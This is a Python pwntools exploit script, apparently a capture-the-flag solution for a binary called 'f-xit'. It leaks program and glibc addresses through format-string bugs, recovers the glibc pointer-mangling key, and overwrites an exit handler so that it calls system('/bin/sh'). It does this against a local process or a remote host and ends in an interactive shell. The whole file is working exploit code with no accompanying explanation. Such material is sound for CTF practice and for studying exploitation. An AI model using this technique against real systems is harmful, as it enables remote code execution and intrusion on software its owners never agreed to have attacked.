#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('f-xit')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendline(b'%43$lx.%61$lx')
    leaks = p.recv().decode().split('.')
    main_addr = int(leaks[0], 16)
    __libc_start_main_addr = int(leaks[1], 16) - 128

    log.info(f'Leaked main() address: {hex(main_addr)}')
    log.info(f'Leaked __libc_start_main() address: {hex(__libc_start_main_addr)}')

    elf.address = main_addr - elf.sym.main
    glibc.address = __libc_start_main_addr - glibc.sym.__libc_start_main

    log.success(f'ELF base address: {hex(elf.address)}')
    log.success(f'Glibc base address: {hex(glibc.address)}')

    rol = lambda val, r_bits, max_bits: \
        (val << r_bits % max_bits) & (2 ** max_bits - 1) | \
        ((val & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

    ror = lambda val, r_bits, max_bits: \
        ((val & (2 ** max_bits - 1)) >> r_bits % max_bits) | \
        (val << (max_bits - (r_bits % max_bits)) & (2 ** max_bits - 1))

    encrypt = lambda value, key: rol(value ^ key, 0x11, 64)

    __exit_funcs      = glibc.address + 0x219838
    exit_handler_addr = glibc.address + 0x21af00
    _dl_fini          = glibc.address + 0x236040 - 0x6000

    log.info(f'__exit_funcs address: {hex(__exit_funcs)}')
    log.info(f'Original exit handler address: {hex(exit_handler_addr)}')
    log.info(f'_dl_fini address: {hex(_dl_fini)}')

    p.sendline(b'%7$s....' + p64(exit_handler_addr + 0x18))

    encrypted_function = u64(p.recv().strip().split(b'....')[0])

    key = ror(encrypted_function, 0x11, 64) ^ _dl_fini

    log.info(f'Encrypted function: {hex(encrypted_function)}')
    log.info(f'Encryption key: {hex(key)}')
    log.info(f'Sanity check: {hex(encrypt(_dl_fini, key))}')

    payload = fmtstr_payload(6, {
        exit_handler_addr + 0x18: encrypt(glibc.sym.system, key),
    })
    p.sendline(payload)
    p.recv()

    payload = fmtstr_payload(6, {
        exit_handler_addr + 0x20: next(glibc.search(b'/bin/sh')),
    })
    p.sendline(payload)
    p.recv()

    p.sendline(b'quit')
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
